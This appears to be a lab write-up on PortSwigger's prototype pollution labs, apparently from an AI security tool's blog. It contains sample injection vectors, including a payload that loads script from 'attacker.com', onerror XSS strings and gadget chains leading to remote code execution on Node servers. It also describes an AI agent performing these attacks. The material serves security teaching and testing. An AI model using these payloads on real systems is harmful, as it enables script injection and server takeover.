# PortSwigger Academy — Prototype Pollution (10 labs)

*Expanded from the RedPick blog post [100% on PortSwigger Academy](https://redpick.ai/blog/redpick-scores-100-portswigger).*

The 10 PortSwigger prototype pollution labs span both client-side and server-side attack surfaces.

## Client-side prototype pollution

**Attack flow:**

1. Inject `__proto__` properties through URL fragments, query parameters, or JSON merge operations
2. Trace how the polluted property propagates through JavaScript libraries until it reaches a dangerous DOM sink: `innerHTML`, `eval`, `document.write`, `location.href`, etc.
3. The challenge is discovering which library code reads from the polluted prototype

**Example injection vectors:**

- URL query string: `?__proto__[src]=//attacker.com/xss.js`
- URL fragment: `#__proto__[onerror]=alert(1)`
- JSON POST: `{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}`
- Array-like injection: `?__proto__.propertyKey=value`

**Gadget examples:**

- jQuery: polluted `$.extend` with `innerHTML` → DOM XSS
- Lodash `merge` with `src` property → script tag injection
- Underscore with `__proto__` in object merge → object property takeover

## Server-side prototype pollution (Expert)

The most dangerous chains reach `child_process.execSync` or `require()` through unexpected property lookups in:

- **Express**: `req.body` merge into session → polluted `__proto__.shell` read by child_process
- **EJS / Pug template engines**: polluted `outputFunctionName` or `escapeFunction` → template injection → RCE
- **Mongoose**: polluted `__proto__.isNew` → unintended document creation/modification
- **Express HPP middleware**: polluted `__proto__.allowed` → query parameter bypass

**Attack requirements:**

1. Identify a JSON merge/clone operation on user input (typical in PUT/PATCH endpoints that accept partial updates)
2. Probe the Node.js application for prototype-accessible properties (`req.app.locals.__proto__` inheritance chains)
3. Find a "gadget" — a code path that reads a property which, if polluted, changes behavior
4. Chain the pollution primitive with the gadget to achieve RCE or access control bypass

## Detection technique: the `Object.prototype` probe

RedPick detects prototype pollution with a canary probe:

```json
{"__proto__": {"redpickPolluted": "canary-string"}}
```

Then checks in a subsequent request whether any response or behavior references `redpickPolluted` — indicating the prototype was successfully polluted and is being read somewhere downstream.

## Why prototype pollution is hard to fix

Prototype pollution is particularly dangerous because:

- The root cause (unsafe merge/clone) may be in a deep dependency
- The exploitability gadget may be in a completely different dependency
- Each JavaScript library has different "safe" patterns — what's safe in React may be dangerous in Express
- The pollution persists across requests in the same process (not just the injection request)

This is why server-side prototype pollution is rated Expert — the agent must understand the full dependency graph, not just find the injection point.

## Key insight

Client-side prototype pollution is about finding the sink in loaded JavaScript. Server-side prototype pollution is about finding the gadget in runtime code paths. The pollution primitive is similar; the exploitation skill is very different.
